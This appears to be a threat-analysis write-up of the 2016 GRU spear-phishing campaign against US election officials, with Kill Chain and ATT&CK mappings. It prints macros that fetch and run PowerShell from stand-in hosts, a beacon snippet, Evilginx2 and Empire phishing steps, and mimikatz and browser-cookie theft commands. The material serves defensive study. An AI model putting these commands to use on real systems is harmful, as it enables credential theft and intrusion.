# **GRU Spear-Phishing Campaign Targeting U.S. Elections (2016)**
## **Overview**
This document provides an in-depth analysis of the **2016 spear-phishing campaign executed by the Russian GRU** against U.S. election infrastructure and local government officials. The campaign involved:

- **Targeted spear-phishing emails** disguised as election-related communications.
- **Trojanized Microsoft Word documents** with embedded **Visual Basic (VBA) macros**.
- **PowerShell execution for payload retrieval** from a compromised IIS web server.
- **Credential harvesting and persistent access mechanisms**.

This attack aimed to **compromise U.S. election officials and systems** by leveraging phishing techniques, malware deployment, and spoofed infrastructure.

📌 **Reference Article:** [NSA Report on GRU Spear-Phishing](https://theintercept.com/2017/06/05/top-secret-nsa-report-details-russian-hacking-effort-days-before-2016-election/)

---

## **1. Cyber Kill Chain Breakdown**
The attack aligns with **Lockheed Martin's Cyber Kill Chain**, which describes the sequential phases of a cyberattack.

| **Kill Chain Phase**  | **Attack Activity** |
|----------------------|--------------------|
| **1. Reconnaissance** | GRU operators collected emails from election officials via OSINT and previous breaches. |
| **2. Weaponization** | Crafted phishing emails with malicious Microsoft Word attachments containing VBA macros. |
| **3. Delivery** | Sent emails using spoofed domains and fake election-related services. |
| **4. Exploitation** | Victims opened the Word documents, triggering PowerShell commands via VBA macros. |
| **5. Installation** | PowerShell downloaded and executed a secondary payload, likely an implant or backdoor. |
| **6. Command & Control** | The payload beaconed out to GRU-controlled infrastructure on port 3080. |
| **7. Actions on Objectives** | Attackers harvested credentials and likely gained persistent access to election systems. |

---

## **2. MITRE ATT&CK Mapping**
This table maps the GRU’s attack techniques to the **MITRE ATT&CK framework**, categorizing tactics and techniques used.

| **MITRE ATT&CK ID** | **Tactic** | **Technique** | **Description** |
|--------------------|-----------|--------------|----------------|
| **T1598.003** | Reconnaissance | Gather Victim Identity Information: Email Addresses | The GRU collected email addresses from government personnel. |
| **T1566.001** | Initial Access | Spearphishing Attachment | Attackers sent emails containing **malicious Word documents**. |
| **T1204.002** | Execution | Malicious File | Victims opened the **VBA-macro-enabled Word documents**. |
| **T1059.001** | Execution | PowerShell | VBA macros executed PowerShell commands to download malware. |
| **T1105** | Command & Control | Ingress Tool Transfer | The payload was retrieved from an IIS server via PowerShell. |
| **T1566.002** | Initial Access | Spearphishing Link | Emails contained **spoofed domains impersonating election authorities**. |
| **T1133** | Persistence | External Remote Services | Attackers likely maintained persistent access via VPN or RDP. |
| **T1078** | Persistence | Valid Accounts | Compromised credentials were used to access election systems. |

---

## **3. Attack Flow Based on the NSA Report and Image**
### **🟠 Phase 1: Reconnaissance (Identifying Targets)**
- The GRU **collected U.S. election officials' email addresses** using:
  - OSINT (Open-Source Intelligence)
  - Previously compromised credentials from past breaches

---

### **🔴 Phase 2: Staging & Weaponization**
- **Step 1: Creating a Fake Email Address**
  - The attackers **registered a fake Gmail account** (e.g., `vr.elections@gmail.com`), impersonating a **U.S. election service**.
  
- **Step 2: Preparing the Phishing Email**
  - The email contained **Microsoft Word attachments** titled:
    - `New_EViD_User_Guides.docm`
    - `Election_Software_Configuration.docm`
  - These documents had embedded **VBA macros**, triggering **PowerShell** execution.

---

### **🟡 Phase 3: Delivery (Sending Phishing Emails)**
- The GRU **sent spear-phishing emails** to at least **122 U.S. local government officials**.
- The emails contained a **spoofed election-related message**, appearing as an official notification.
- Some test emails were sent to **non-existent addresses**, likely to prepare **fake absentee ballot services**.

---

### **🟢 Phase 4: Exploitation (Opening the Document & Payload Execution)**
- When victims opened the **trojanized Microsoft Word documents**, they unknowingly executed:
  ```vbscript
  Sub AutoOpen()
      Dim objShell
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command iex(New-Object Net.WebClient).DownloadString('http://malicious-server.com/payload.ps1')"
  End Sub
  ```
- The **PowerShell script**:
  - Connected to a **GRU-controlled server**.
  - Downloaded and executed **a secondary payload**.

---

### **🔵 Phase 5: Installation & Persistence**
- The secondary payload likely **installed a backdoor** for persistent access.
- It beaconed back to a **malicious IIS web server** at a **U.S.-based IP (Port 3080)**.

---

### **🟣 Phase 6: Command & Control**
- The malware established a connection to **GRU-controlled infrastructure**:
  ```powershell
  $url = "http://malicious-server.com/beacon"
  $wc = New-Object System.Net.WebClient
  $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)")
  $wc.DownloadString($url)
  ```
- This **allowed remote control** of the infected machine.

---

### **⚫ Phase 7: Actions on Objectives**
- The attackers likely:
  - **Harvested credentials** from election officials.
  - Used compromised credentials to **access voter registration systems**.
  - Attempted **further attacks on election infrastructure**.

---

## **4. Tools & Commands for Simulating the Attack**
### **Phishing Infrastructure Setup**
- **Using GoPhish to Send Emails**
  ```bash
  docker run --rm -it -p 3333:3333 -p 8080:8080 gophish/gophish
  ```

- **Using Evilginx2 for Reverse Proxy Phishing**
  ```bash
  git clone https://github.com/kgretzky/evilginx2.git
  cd evilginx2
  go build
  sudo ./evilginx -p ./phishlets/google.yaml
  ```

---

### **Weaponization: Creating Malicious Documents**
- **Using `Empire` to Generate VBA Macros**
  ```powershell
  usestager windows/macro
  set Listener http
  execute
  ```
- **Embedding Malicious Macros into Word Documents**
  ```vbscript
  Sub AutoOpen()
      Shell "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
  End Sub
  ```

---

### **Persistence & Credential Harvesting**
- **Dumping Windows Credentials**
  ```bash
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
  ```

- **Extracting Browser Session Cookies**
  ```bash
  sqlite3 ~/.mozilla/firefox/*.default/cookies.sqlite "SELECT host, name, value FROM moz_cookies WHERE host LIKE '%google.com%';"
  ```

---

## **5. Conclusion**
This document reconstructs the **GRU’s spear-phishing campaign against U.S. elections**, providing a **real-world simulation** of the attack. Understanding these **TTPs** helps **Red Teams and Blue Teams** develop stronger defenses.
